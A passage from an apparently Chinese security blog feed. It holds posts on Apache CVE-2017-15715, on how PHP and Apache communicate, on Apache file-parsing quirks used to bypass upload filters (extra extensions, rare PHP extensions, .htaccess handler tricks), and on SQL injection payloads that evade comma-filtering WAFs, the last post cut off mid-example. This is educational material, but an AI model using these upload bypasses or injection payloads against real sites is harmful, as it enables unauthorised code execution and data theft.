alt><br>可以看见，这里出现了两个warning，其实并非测试不成功，可以看见其实是绕过了我们代码里的黑名单的，已经执行到了move_uploaded_file了，说明程序并没有因为没有绕过黑名单而exit，但是因为涉及到文件读写，而windows操作系统不允许后缀以换行符结尾的文件命名方式，所以这里会文件会创建失败，就出现了这两个warning了。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结:"></a>总结:</h3><p>研究这个漏洞的过程中遇到几个问题：<br>1.获取文件名时不能用$_FILES[‘file’][‘name’]，因为他会自动把换行去掉，这一点有点鸡肋<br>2.默认的Apache配置即可利用，因为默认Apache配置就使用了<filematch>：</filematch></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch \.php$&gt;</span><br><span class="line">    SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>所以理论上，只要用正则来匹配后缀进行php解析的Apache就有这个问题。而这个做法刚好是为了解决Apache老的解析漏洞而做的，可谓非此即彼，必然存在一种解析漏洞。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;apache最新解析漏洞(CVE-2017-15715)绕过文件上传限制&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
    
      <category term="i春秋" scheme="http://yoursite.com/categories/CTF/i%E6%98%A5%E7%A7%8B/"/>
    
    
      <category term="解析漏洞" scheme="http://yoursite.com/tags/%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>PHP和Apache是如何通信的?</title>
    <link href="http://yoursite.com/2019/08/01/PHP%E5%92%8CApache%E6%98%AF%E5%A6%82%E4%BD%95%E9%80%9A%E4%BF%A1%E7%9A%84/"/>
    <id>http://yoursite.com/2019/08/01/PHP和Apache是如何通信的/</id>
    <published>2019-08-01T08:46:30.000Z</published>
    <updated>2019-08-03T06:03:18.594Z</updated>
    
    <content type="html"><![CDATA[<h4 id="apache与php沟通的三种方式"><a href="#apache与php沟通的三种方式" class="headerlink" title="apache与php沟通的三种方式"></a><strong>apache与php沟通的三种方式</strong></h4><a id="more"></a><hr><p>php与apache的主要沟通方式就分为了如下的三种方式<br>cgi模式<br>模块化方式<br>fastcgi模式</p><h5 id="cgi模式"><a href="#cgi模式" class="headerlink" title="cgi模式"></a><strong>cgi模式</strong></h5><hr><p>cgi定义与说明:<br><strong>我们先来通俗的解释一下什么是cgi,首先cgi是一种规范，汉化的解释为通用的网关接口，其实就是web服务器与php之间的一个翻译机，当web服务器接收到一个请求过来的时候，如果你是用的这种方式，因为浏览器是只能识别html或者其他静态信息的，所以cgi就会给你做出php代码的转换，那么这个程序位于哪里呢？</strong><br>以phpstudy为例 ，位于php的bin目录会看到这个可执行程序。<br><img src="en-resource://database/40751:0" alt="bc528b9ef74af197ad428ebb6dbac6db.png"><br>那具体的在apache里应该怎么来配置呢？<br> 对 PHP 5 用这行：<br> Action application/x-httpd-php “/php/php-cgi.exe”</p><hr><h5 id="模块化方式"><a href="#模块化方式" class="headerlink" title="模块化方式"></a><strong>模块化方式</strong></h5><hr><p>模块化方式通俗解释：<br>在模块化(DLL)中，PHP是与Web服务器一起启动并运行的，再通俗点说两者是同一个进程的方式在运行，那么具体怎么配置呢？<br> 对 PHP 5 用这两行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">　　LoadModule php5_module “c:/php/php5apache2.dll”</span><br><span class="line"></span><br><span class="line">　　AddType application/x-httpd-php .php</span><br></pre></td></tr></table></figure><p>　　 配置 php.ini 的路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">　　PHPIniDir “C:/php”</span><br></pre></td></tr></table></figure><p>TIP：<br>配置apache以运行php程序</p><p>第一步：装载php”模块”,”模块”就是指php的语言包，即我们下载解压后的php文件目录。将此目录改名为”php”复制到amp目录下（和apache目录同级），然后打开apache的配置文件httpd.conf,该文件在amp\Apache\conf目录下。在配置文件中插入如下代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">LoadModule php_module &quot;E:/amp/php/php7apache2_4.dll&quot;</span><br><span class="line">&lt;FilesMatch &quot;\.php$\&quot;&gt;</span><br><span class="line">setHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>该配置文件的代码作用是，告知appache，凡是带.php后缀的文件都要找php语言模块处理,”php7apache2_4.dll”文件在amp\php目录下<br>还有另一种配置方式:<br>AddType application/x-httpd-php .php .pap .phtml<br>这些.pap .phtml 是我们自定义的文件后缀，同样也可以用php模块处理</p><hr><h5 id="fastcgi"><a href="#fastcgi" class="headerlink" title="fastcgi"></a><strong>fastcgi</strong></h5><hr><p>说白点fastcgi也是一种协议，它是一个cgi的管理者，那么它的具体实现到php中就是php的php-fpm模块，但是在apache中是用的专门的fastcgi模块，需要下载.so文件，php-fpm在php5.3以后不再作为第三方的模块而是集成到了php中，它会提前的开启多个cgi程序，管理这些进程，并提供方式合理有效的调度，保证了并发性。</p>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;apache与php沟通的三种方式&quot;&gt;&lt;a href=&quot;#apache与php沟通的三种方式&quot; class=&quot;headerlink&quot; title=&quot;apache与php沟通的三种方式&quot;&gt;&lt;/a&gt;&lt;strong&gt;apache与php沟通的三种方式&lt;/strong&gt;&lt;/h4&gt;
    
    </summary>
    
      <category term="杂谈" scheme="http://yoursite.com/categories/%E6%9D%82%E8%B0%88/"/>
    
    
  </entry>
  
  <entry>
    <title>文件解析漏洞总结-Apache</title>
    <link href="http://yoursite.com/2019/08/01/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93-Apache/"/>
    <id>http://yoursite.com/2019/08/01/文件解析漏洞总结-Apache/</id>
    <published>2019-08-01T05:42:16.000Z</published>
    <updated>2019-08-03T06:05:23.785Z</updated>
    
    <content type="html"><![CDATA[<h4 id="文件解析漏洞总结-Apache"><a href="#文件解析漏洞总结-Apache" class="headerlink" title="文件解析漏洞总结-Apache"></a><strong>文件解析漏洞总结-Apache</strong></h4><a id="more"></a><hr><p>百度许久，又谷歌一番，最终发觉，Apache关于文件解析，似乎只有三种“漏洞”。之所以打引号是因为我觉得这三种“漏洞”都不是Apache的漏洞，只是其特性，而很多程序员不了解这种特性，故而写出有问题的代码，这才给黑客可趁之机，造成漏洞。但大家都称呼这是Apache的文件解析漏洞，我也只好随大流了。<br><strong>1.多后缀名</strong><br>先说第一种特性：多后缀名。这是怎么的一种鲜为人知的特性呢？原来是这样的，Apache认为，一个文件可以有多个后缀，如：werner.txt.png.mp3。这一文件，放在Windows里，毫无疑问，就是个mp3文件，Windows只认最后一个“.”及其后面的字符“mp3”，觉得该文件后缀为“.mp3”，这也是大多数操作系统、应用软件的处理方式、是正常人习惯。而在Apache中，则可能有所不同，如果有必要，Apache会从后（右）往前（左），一一辨别后缀。何时有必要？当Apache不认识某个后缀时，便有必要。如某文件名为：werner.mp3.html.qwe.arex，Apache在处理时，先读取最后一个后缀，为“.arex”，一看，这啥玩意啊，不认识，继续读取下一个后缀“.qwe”，一看，呀，这又是啥，还是不认识，继续读下一个后缀“.html”，一看，哦，这是个超文本标记语言文件，俗称网页文件，这回认识了，也就不继续读下一个后缀了。若是所有后缀都看完了没有一个认识怎么办？此时就会把该文件当做默认类型进行处理了，一般来说，默认类型是text/plain。据说在Apache的配置文件中搜索“DefaultType”就能看到默认类型的明确定义了，但我却不知为何，没有找到。<br>哪些后缀Apache认识，哪些不认识？有一个名为mime.types的文件，其中记录着Apache认识的后缀。在Ubuntu下，该文件位于/etc/mime.types，在Windows下，该文件位于C:/apache/conf/mime.types（类似这样的，注意Apache的安装路径）。该文件是一个一对多的映射表，定义了某一种文件类型，对应的几种后缀。除了该文件，在Apache的配置文件中，还可以用AddCharset语句添加映射，如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddCharset us-ascii   .ascii .us-ascii</span><br><span class="line">AddCharset ISO-2022-CN .iso2022-cn .cis</span><br></pre></td></tr></table></figure><p>mime.types是个很长的文件，大概看了下，Apache认识的后缀比我多多了。节选部分如下所示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">application/java-archive          jar</span><br><span class="line">application/m3g                         m3g</span><br><span class="line">application/java-vm                   class</span><br><span class="line">application/javascript                js</span><br><span class="line">application/json                    json</span><br><span class="line">text/html                             html htm shtml</span><br><span class="line">text/x-diff                             diff patch</span><br><span class="line">video/x-flv                             flv</span><br><span class="line">video/x-la-asf                          lsf lsx</span><br><span class="line">video/x-mng                             mng</span><br><span class="line">video/x-ms-asf                          asf asx</span><br><span class="line">video/x-ms-wm                         wm</span><br></pre></td></tr></table></figure><p>这一特性会带来什么问题呢？网站往往有上传文件的功能，但一定不想让用户上传程序，因为这很可能会危害网站安全，故而会检查上传文件的后缀名，若是.php，则拒绝上传（假设这是个php站）。此时用户只需上传文件evildoer.php.qwe，若是程序员不了解Apache的这一特性，编写的程序检查后缀时只看“.qwe”，而认为这不是程序文件，允许上传，则用户成功地绕过了上传时的安全检查，上传了php程序文件。该文件的最后一个后缀“.qwe”是Apache不认识的，故而Apache会以倒数第二个后缀“.php”为准，把该文件当做是php文件，解析执行。</p><p>这总是奏效的吗？按理来说，由于这是特性而不是漏洞，所以适用于所有版本的Apache。这一奇怪的特性，说不定正是Apache的自豪之处呢。但是，在我的测试中却发现，类似aaa.php.xxx的文件并不会被作为php程序执行，而是被当成文本文件，返回给浏览器，在浏览器中可以看到php源码，而不是执行结果。测试环境是Ubuntu14.04+Apache2.4.7+php5。</p><p>这是怎么回事？难道前面几百字都是废话，说的是错的？我们来做个实验。准备一个文件，内容随意，命名为test.jpg.aaa，放置在Apache中，然后在浏览器中访问它，结果如下图所示：<br><img src="http://i2.tiimg.com/695378/ad6bbdedf27c86bb.png" alt><br>可见浏览器是将该文件作为图片处理的。浏览器为何认为test.jpg.aaa是图片呢？aaa可不是图片文件的后缀。这是因为服务器的响应HTTP头中的Content-Type字段值为image/jpeg，浏览器看到image/jpeg，便知这是图片文件。这说明服务器（此处即Apache）是把test.jpg.aaa当做图片的，也说明，前面分析的Apache的多后缀处理是没有错的。</p><p>那么aaa.php.xxx为何没有被作为php代码执行呢？我猜是这样的，当然只是我的猜测，实在是找不到相关资料，只好猜了。Apache看到文件aaa.php.xxx，按照多后缀名的解析规则，认为该文件是php程序文件，把该文件作为php程序文件处理。怎么处理呢？交给php解释器，Apache本身并不懂php。而php解释器却有着和Apache不同的后缀解析规则，可能只认最后一个后缀，故而认为aaa.php.xxx不是php程序文件，拒绝执行。在我的测试环境中，php以模块（module）的模式工作于Apache的领导下。这种模式下php接受到领导Apache分配的任务——aaa.php.xxx，一看，不是php程序文件，没法执行，但也没有报错，而是返回了文件内容本身。php还可以以FASTCGI的模式工作于Apache中，此种模式下php遇到类似aaa.php.xxx这种不是php程序的文件，会触发500错误。</p><p>php本身是如何识别文件的呢？我在Apache的模块的配置文件中找到了php5.conf，内容如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">FilesMatch</span> "<span class="attr">.</span>+\<span class="attr">.ph</span>(<span class="attr">p</span>[<span class="attr">345</span>]?|<span class="attr">t</span>|<span class="attr">tml</span>)$"&gt;</span></span><br><span class="line">    SetHandler application/x-httpd-php</span><br><span class="line"><span class="tag">&lt;/<span class="name">FilesMatch</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">FilesMatch</span> "<span class="attr">.</span>+\<span class="attr">.phps</span>$"&gt;</span></span><br><span class="line">    SetHandler application/x-httpd-php-source</span><br><span class="line">    # Deny access to raw php sources by default</span><br><span class="line">    # To re-enable it's recommended to enable access to the files</span><br><span class="line">    # only in specific virtual host or directory</span><br><span class="line">    Order Deny,Allow</span><br><span class="line">    Deny from all</span><br><span class="line"><span class="tag">&lt;/<span class="name">FilesMatch</span>&gt;</span></span><br><span class="line"># Deny access to files without filename (e.g. '.php')</span><br><span class="line"><span class="tag">&lt;<span class="name">FilesMatch</span> "^\<span class="attr">.ph</span>(<span class="attr">p</span>[<span class="attr">345</span>]?|<span class="attr">t</span>|<span class="attr">tml</span>|<span class="attr">ps</span>)$"&gt;</span></span><br><span class="line">    Order Deny,Allow</span><br><span class="line">    Deny from all</span><br><span class="line"><span class="tag">&lt;/<span class="name">FilesMatch</span>&gt;</span></span><br><span class="line"></span><br><span class="line"># Running PHP scripts in user directories is disabled by default</span><br><span class="line">#</span><br><span class="line"># To re-enable PHP in user directories comment the following lines</span><br><span class="line"># (from <span class="tag">&lt;<span class="name">IfModule</span> <span class="attr">...</span>&gt;</span> to <span class="tag">&lt;/<span class="name">IfModule</span>&gt;</span>.) Do NOT set it to On as it</span><br><span class="line"># prevents .htaccess files from disabling it.</span><br><span class="line"><span class="tag">&lt;<span class="name">IfModule</span> <span class="attr">mod_userdir.c</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Directory</span> /<span class="attr">home</span>/*/<span class="attr">public_html</span>&gt;</span></span><br><span class="line">        php_admin_flag engine Off</span><br><span class="line">    <span class="tag">&lt;/<span class="name">Directory</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">IfModule</span>&gt;</span></span><br></pre></td></tr></table></figure><p>阅读上示配置文件可知，被当做php程序执行的文件名要符合正则表达式：”.+.ph(p[345]?|t|tml)”，其中“”符号在正则中匹配结束，故而可知php本身确实是只看最后一个后缀的。就算Apache把某文件当php程序，php自己不认它，也是无用。进一步试验，把php5.conf文件中刚刚提到的正则表达式的“$”换成“.”，即：<br><code>&quot;.+\.ph(p[345]?|t|tml)\.&quot;</code>,然后重启Apache使配置文件生效，再在浏览器中访问aaa.php.xxx，这次，aaa.php.xxx果然被当做php程序执行了，在浏览器中，看到的是程序执行结果而不是源码。这也从侧面验证了，我的猜测是正确的。测试完之后，一定要记得改回去。<br><strong>2.罕见后缀计</strong><br>算机世界自开天辟地以来，便自由多彩。还记得mime.types文件吗？在该文件中搜索“php”这三个字母，结果如下所示：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">werner@Yasser:~$ cat /etc/mime.types | grep php</span><br><span class="line"><span class="comment">#application/x-httpd-php          phtml pht php</span></span><br><span class="line"><span class="comment">#application/x-httpd-php-source           phps</span></span><br><span class="line"><span class="comment">#application/x-httpd-php3         php3</span></span><br><span class="line"><span class="comment">#application/x-httpd-php3-preprocessed        php3p</span></span><br><span class="line"><span class="comment">#application/x-httpd-php4         php4</span></span><br><span class="line"><span class="comment">#application/x-httpd-php5         php5</span></span><br></pre></td></tr></table></figure><p>还记得正则表达式”.+.ph(p[345]?|t|tml)$”吗，该正则表达式匹配的不仅仅有php，还有php3、php4、php5、pht和phtml。</p><p>好吧，原来不仅php，就连phtml、pht、php3、php4和php5都是Apache和php认可的php程序的文件后缀。我原本只知道“.php”的，真是大开眼界。这就好比，不仅py是Python程序文件的后缀，还有pyc和pyo也都是。写上传过滤规则的程序员是否博学多识，也知道这些知识呢？我想，大抵是不知道的。利用这些“罕见”的后缀名，也可能绕过安全检查，干些“坏事”。</p><p>我在Ubuntu14.04+Apache2.4.7中进行测试，先准备文件text.php，其内容是经典的<br>Hello World：<br><code>&lt;?php echo &#39;HELLO WORLD&#39;; ?&gt;</code><br>然后在浏览器中打开它，成功显示“HELLO WORLD”。再修改该文件后缀为各种后缀，进行测试。测试结果是，以php、phtml、pht、php3、php4和php5为后缀，能成功看到“HELLO WORLD”；以phps为后缀，会报403错误，Forbidden；以php3p为后缀，会在浏览器中看到源码。</p><p><strong>3.妙用.htaccess</strong><br>.htaccess是Apache的又一特色。一般来说，配置文件的作用范围都是全局的，但Apache提供了一种很方便的、可作用于当前目录及其子目录的配置文件——.htaccess（分布式配置文件）。</p><p>要想使.htaccess文件生效，需要两个条件，一是在Apache的配置文件中写上：<br><code>AllowOverride All</code><br>若这样写则.htaccess不会生效：<br><code>AllowOverride None</code><br>二是Apache要加载mod_Rewrite模块。加载该模块，需要在Apache的配置文件中写上：<br>LoadModule rewrite_module /usr/lib/apache2/modules/mod_rewrite.so<br>需要注意Apache可能有多个配置文件，后加载的配置文件会覆盖先加载的配置文件中的配置。所以在某个配置文件中将AllowOverride设置成All，若是其后加载的某个配置文件中AllowOverride的设置是None，则也是没有用的。一般来说，先加载httpd.conf，再加载conf.d/中的配置文件，最后加载sites-enabled/中的配置文件。</p><p>这意味着，.htaccess并不总是有效的。而且不幸的是，在我的测试环境中.htaccess默认无效。好吧，为了测试，我只好将它改为有效。以下讨论均在.htaccess有效的前提下进行。</p><p>.htaccess文件可以配置很多事情，如是否开启站点的图片缓存、自定义错误页面、自定义默认文档、设置WWW域名重定向、设置网页重定向、设置图片防盗链和访问权限控制。但我们这里只关心.htaccess文件的一个作用——MIME类型修改。如在.htaccess文件中写入：<br><code>AddType application/x-httpd-php xxx</code><br>就成功地使该.htaccess文件所在目录及其子目录中的后缀为.xxx的文件被Apache当做php文件。另一种写法是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;shell.jpg&quot;&gt;</span><br><span class="line">  SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>该语句会让Apache把shell.jpg文件解析为php文件。<br>下面是一次测试，测试前已经打开Apache对.htaccess文件的支持。在网站根目录中准备如下文件树：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">│</span><br><span class="line">├── htaccess_test/</span><br><span class="line">│   ├── .htaccess</span><br><span class="line">│   ├── shell.jpg</span><br><span class="line">│   ├── type.xxx</span><br><span class="line">│   └── test/</span><br><span class="line">│       ├── shell.jpg</span><br><span class="line">│       └── type.xxx</span><br><span class="line">├── shell.jpg</span><br><span class="line">└── type.xxx</span><br></pre></td></tr></table></figure><p>其中，文件.htaccess的内容为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php xxx</span><br><span class="line"></span><br><span class="line">&lt;FilesMatch &quot;shell.jpg&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>文件shell.jpg和type.xxx的内容相同，均为：<br><code>&lt;?php echo &#39;HELLO WORLD&#39;; ?&gt;</code><br>然后在浏览器中访问各文件，结果如下表所示：<br><img src="http://i1.fuimg.com/695378/9e2ba440510aae5b.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;文件解析漏洞总结-Apache&quot;&gt;&lt;a href=&quot;#文件解析漏洞总结-Apache&quot; class=&quot;headerlink&quot; title=&quot;文件解析漏洞总结-Apache&quot;&gt;&lt;/a&gt;&lt;strong&gt;文件解析漏洞总结-Apache&lt;/strong&gt;&lt;/h4&gt;
    
    </summary>
    
      <category term="漏洞原理" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/"/>
    
      <category term="解析漏洞" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/"/>
    
    
  </entry>
  
  <entry>
    <title>sql注入中的绕过</title>
    <link href="http://yoursite.com/2019/07/30/sql%E6%B3%A8%E5%85%A5%E4%B8%AD%E7%9A%84%E7%BB%95%E8%BF%87/"/>
    <id>http://yoursite.com/2019/07/30/sql注入中的绕过/</id>
    <published>2019-07-30T08:03:02.000Z</published>
    <updated>2019-08-03T06:04:20.447Z</updated>
    
    <content type="html"><![CDATA[<p>sql注入绕过详解。</p><a id="more"></a><h4 id="一、SQL注入逗号绕过"><a href="#一、SQL注入逗号绕过" class="headerlink" title="一、SQL注入逗号绕过"></a><strong>一、SQL注入逗号绕过</strong></h4><hr><p><strong>1.联合查询显注绕过</strong><br>逗号在联合查询时使用 UNION SELECT 1,2,3,4,5,6,7..n 这样的格式爆显示位，语句中包含了多个逗号，如果有WAF拦截了逗号时，我们的联合查询不能用了。<br>绕过<br>在显示位上替换为常见的注入变量或其它语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2,3;</span><br><span class="line"></span><br><span class="line">union select * from ((select 1)A join (select 2)B join (select 3)C）;</span><br><span class="line"></span><br><span class="line">union select * from ((select 1)A join (select 2)B join (select group_concat(user(),&apos; &apos;,database(),&apos; &apos;,@@datadir))C);</span><br></pre></td></tr></table></figure><p>在数据库中演示联合查询<br>UNION开始是我们在URL中注入的语句，这里只是演示，在实际中如果我们在注入语句中有逗号就可能被拦截</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select user_id,user,password from users union select 1,2,3;</span><br><span class="line">+---------+-------+----------------------------------+</span><br><span class="line">| user_id | user  | password                         |</span><br><span class="line">+---------+-------+----------------------------------+</span><br><span class="line">|       1 | admin | 5f4dcc3b5aa765d61d8327deb882cf99 ||       1 | 2     | 3                                |</span><br><span class="line">+---------+-------+----------------------------------+</span><br><span class="line">2 rows in set (0.04 sec)</span><br></pre></td></tr></table></figure><p>不出现逗号，使用Join来注入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select user_id,user,password <span class="keyword">from</span> users union select * <span class="keyword">from</span> ((select <span class="number">1</span>)A join (select <span class="number">2</span>)B join (select group_concat(user(),<span class="string">' '</span>,database(),<span class="string">' '</span>,@@datadir))C);;</span><br><span class="line">+---------+-------+-------------------------------------------------+</span><br><span class="line">| user_id | user  | password                                        |</span><br><span class="line">+---------+-------+-------------------------------------------------+</span><br><span class="line">|       <span class="number">1</span> | admin | <span class="number">5</span>f4dcc3b5aa765d61d8327deb882cf99                |</span><br><span class="line">|       <span class="number">1</span> | <span class="number">2</span>     | root@<span class="number">192.168</span><span class="number">.228</span><span class="number">.1</span> dvwa c:\phpStudy\MySQL\data\ |</span><br><span class="line">+---------+-------+-------------------------------------------------+</span><br><span class="line"><span class="number">2</span> rows <span class="keyword">in</span> set (<span class="number">0.08</span> sec)</span><br></pre></td></tr></table></figure><p><strong>2.盲注中逗号绕过</strong><br>MID 和substr 函数用于从文本字段中提取字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">mysql&gt; select mid(user(),1,2);</span><br><span class="line">+-----------------+</span><br><span class="line">| mid(user(),1,2) |</span><br><span class="line">+-----------------+</span><br><span class="line">| ro              |</span><br><span class="line">+-----------------+1 row in set (0.04 sec)</span><br></pre></td></tr></table></figure><p>查询数据库用户名第一个字符的ascii码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select user_id,user,password from users union select ascii(mid(user(),1,2)),2,3;</span><br><span class="line">+---------+-------+----------------------------------+</span><br><span class="line">| user_id | user  | password                         |</span><br><span class="line">+---------+-------+----------------------------------+</span><br><span class="line">|       1 | admin | 5f4dcc3b5aa765d61d8327deb882cf99 ||     114 | 2     | 3                                |</span><br><span class="line">+---------+-------+----------------------------------+</span><br><span class="line">2 rows in set (0.05 sec)</span><br></pre></td></tr></table></figure><p>盲注，通过猜ascii值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select user_id,user,password from users where user_id=1 and (select ascii(mid(user(),1,2))=115) ;</span><br><span class="line">Empty set</span><br><span class="line"></span><br><span class="line">mysql&gt; select user_id,user,password from users where user_id=1 and (select ascii(mid(user(),1,2))=114) ;</span><br><span class="line">+---------+-------+----------------------------------+</span><br><span class="line">| user_id | user  | password                         |</span><br><span class="line">+---------+-------+----------------------------------+</span><br><span class="line">|       1 | admin | 5f4dcc3b5aa765d61d8327deb882cf99 |</span><br><span class="line">+---------+-------+----------------------------------+</span><br><span class="line">1 row in set (0.04 sec)</span><br></pre></td></tr></table></figure><p>逗号绕过SUBTTRING 函数<br>substring(str FROM pos)<br>从字符串str的起始位置pos 返回一个子串</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select substring(&apos;hello&apos; from 1);</span><br><span class="line">+---------------------------+</span><br><span class="line">| substring(&apos;hello&apos; from 1) |</span><br><span class="line">+---------------------------+</span><br><span class="line">| hello                     |</span><br><span class="line">+---------------------------+1 row in set (0.04 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select substring(&apos;hello&apos; from 2);</span><br><span class="line">+---------------------------+</span><br><span class="line">| substring(&apos;hello&apos; from 2) |</span><br><span class="line">+---------------------------+</span><br><span class="line">| ello                      |</span><br><span class="line">+---------------------------+1 row in set (0.03 sec)</span><br></pre></td></tr></table></figure><p>注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select user_id,user,password from users where user_id=1 and (ascii(substring(user() from 2))=114) ;</span><br><span class="line">Empty set</span><br><span class="line">//substring(user() from 2)为o(这句话是错误的)</span><br><span class="line">//o的ascii为111，</span><br><span class="line">mysql&gt; select user_id,user,password from users where user_id=1 and (ascii(substring(user() from 2))=111) ;</span><br><span class="line">+---------+-------+----------------------------------+</span><br><span class="line">| user_id | user  | password                         |</span><br><span class="line">+---------+-------+----------------------------------+</span><br><span class="line">|       1 | admin | 5f4dcc3b5aa765d61d8327deb882cf99 |</span><br><span class="line">+---------+-------+----------------------------------+</span><br><span class="line">1 row in set (0.03 sec)</span><br></pre></td></tr></table></figure><p>PS：<br>这里要注意：<br>substring(user() from 2) 是从第二个字母向后内容，而ascii函数取得首字母的数值。所以这两个函数要联合起来使用<br><strong>3.绕过逗号还可以使用：</strong><br>limit offset：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from news limit 0,1</span><br><span class="line"># 等价于下面这条SQL语句</span><br><span class="line">select * from news limit 1 offset 0</span><br></pre></td></tr></table></figure><p>select * from table limit 